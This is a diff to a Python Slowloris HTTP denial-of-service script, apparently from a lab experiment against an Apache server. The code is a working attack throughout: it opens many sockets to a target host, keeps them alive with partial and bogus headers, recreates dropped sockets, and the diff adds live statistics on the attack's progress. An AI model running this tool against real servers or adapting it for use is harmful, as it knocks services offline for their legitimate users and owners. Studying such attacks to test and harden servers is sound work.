@@ -6,11 +6,11 @@ import os
 from datetime import datetime
 
 parser = argparse.ArgumentParser(description="Slowloris HTTP DoS")
-parser.add_argument("--h", default="10.68.127.178", type=str, help="Target host") #Experiment target IP
+parser.add_argument("--h", required=True, type=str, help="Target host") #Experiment target IP
 parser.add_argument("--p", default=80, type=int, help="Target port") #HTTP specific attack (Default HTTP port = 80)
 parser.add_argument("--s", default=150, type=int, help="Amount of attacking sockets") #Default MaxRequestWorker value = 400; https://httpd.apache.org/docs/2.4/mod/mpm_common.html#maxrequestworkers
-parser.add_argument("--d", default=10, type=int, help="Delay between partial headers")
-parser.add_argument("--r", default=False, type=bool, help="Recreate failing sockets")
+parser.add_argument("--d", default=10, type=int, help="Delay between partial headers") #Delay between sending partial headers, keeping connections alive
+parser.add_argument("--r", action='store_true', help="Recreate failing sockets") #Recreate failing sockets
 args = parser.parse_args()
 
 host = args.h
@@ -24,18 +24,16 @@ def InitializeSocket():
     s.connect((host, port))
     request = b"GET / HTTP/1.1\r\n"
     s.send(request)
-
     return s
 
 def main():
     #Initializing variables
     sockets = []
-    seconds = 0
+    listOfRecs = []
+    totalRecs = 0
+    totalFails = 0
     dropped = 0
-    startTime = datetime.now().strftime("%H:%M:%S")
-
-    print("Attacking target {}:{} with {} sockets, sending partial headers every {} seconds".format(host, port, n, t))
-    print("Initializing sockets")
+    startTime = datetime.now()
 
     #Initializing sockets (and connections)
     for i in range(n):
@@ -43,17 +41,13 @@ def main():
             s = InitializeSocket()
             sockets.append(s)
         except:
-            print("Failed to initialize socket; sockets will be recreated during attack")
             break
-    print("Starting DoS in 5 seconds..")
-    time.sleep(5)
 
-    #Always
+    #Keep attacking
     while True:
-        #Clear console for a clear overview
-        os.system('cls' if os.name == 'nt' else 'clear')
+        currentTime = datetime.now()
         try:
-            #Send partial headers for every socket. If this fails, remove the failing socket and increment dropped
+            #Send partial headers for every socket. If this fails, remove the failing socket, increment dropped and track droptimes.
             for socket in sockets:
                 try:
                     socket.send(b"Bogus-header: Nonsense\r\n")
@@ -61,28 +55,53 @@ def main():
                     sockets.remove(socket)
                     dropped += 1
 
-            #If sockets are missing, re-initialize n-len(sockets) sockets and increment recreated. If this fails, print to console.   
+            #If sockets are missing, recreate n-len(sockets) sockets and increment recreated. If this fails, increment failed.   
             if r: 
+                recSuccesses = 0
+                recFails = 0
                 for i in range(n-len(sockets)):
                     try:
                         s = InitializeSocket()
                         sockets.append(s)
+                        recSuccesses += 1
                     except:
-                        print("Failed to recreate socket")
+                        recFails += 1
+                recTime = datetime.now().strftime("%H:%M:%S")
+                listOfRecs.append("{}\t{}\t\t{}".format(recTime, recSuccesses, recFails))
+                totalRecs += recSuccesses
+                totalFails += recFails
 
-        #Stop the entire program if keyboard is pressed.
+            #Clear console
+            os.system('cls' if os.name == 'nt' else 'clear')
+
+            #Calculate elapsed time
+            elapsed = round((currentTime-startTime).total_seconds())
+
+            #Print stats
+            print("--INFORMATION--")
+            print("Start-time of attack:            {}".format(startTime.strftime("%H:%M:%S")))
+            print("Target:                          {}:{}".format(host, port))
+            print("Amount of initial sockets:       {}".format(n))
+            print("Delay between partial headers:   {}".format(t))
+            print("Seconds elapsed:                 {}".format(elapsed))
+            print("--SOCKET STATUS--")
+            print("Amount of current sockets:       {}".format(len(sockets)))
+            print("Amount of dropped sockets:       {}".format(dropped))
+            if r:
+                print("-Socket recreation-")
+                print("Total recreated: {}".format(totalRecs))
+                print("Total failed: {}".format(totalFails))
+                print("  Time      Recreated        Failed")
+                for recSocket in listOfRecs:
+                    print(recSocket)
+            time.sleep(t)
+
+        #Stop the entire program if Ctrl+C is pressed.
         except (KeyboardInterrupt):
-            print("Slowloris manually interrupted")
+            stopTime = datetime.now()
+            elapsed = round((stopTime-startTime).total_seconds())
+            print("Slowloris manually interrupted at time {} after {} seconds.".format(stopTime.strftime("%H:%M:%S"), elapsed))
             break
-        
-        #Print numbers
-        print("Start-time of attack:        {}".format(startTime))
-        print("Seconds elapsed:             {}".format(seconds))
-        print("Amount of initial sockets:   {}".format(n))
-        print("Amount of current sockets:   {}".format(len(sockets)))
-        print("Amount of dropped sockets:   {}".format(dropped))
-        time.sleep(t)
-        seconds += t
 
 #Run main method as default
 if __name__ == "__main__":
